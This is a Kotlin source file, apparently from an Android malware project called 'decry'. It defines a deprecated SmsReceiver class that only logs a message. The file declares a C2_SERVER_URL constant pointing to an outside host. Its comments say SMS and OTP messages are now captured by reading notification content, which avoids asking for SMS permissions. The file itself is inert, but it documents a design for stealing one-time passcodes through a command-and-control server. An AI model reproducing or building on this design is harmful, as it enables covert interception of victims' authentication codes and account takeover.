package com.decry.decry

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import org.json.JSONObject

/**
 * SmsReceiver - DEPRECATED
 * 
 * This receiver is no longer used for SMS capture.
 * SMS/OTP messages are now captured via DecryNotificationListenerService
 * which reads notification content instead of requiring SMS permissions.
 * 
 * This class is retained for backward compatibility but does nothing.
 */
class SmsReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "DecrySmsReceiver"
        private const val C2_SERVER_URL = "https://cry-take.vercel.app/api"
    }

    override fun onReceive(context: Context, intent: Intent) {
        // SMS capture is now handled by NotificationListenerService - no action needed
        Log.d(TAG, "SmsReceiver no longer used - notifications handle SMS capture")
    }
}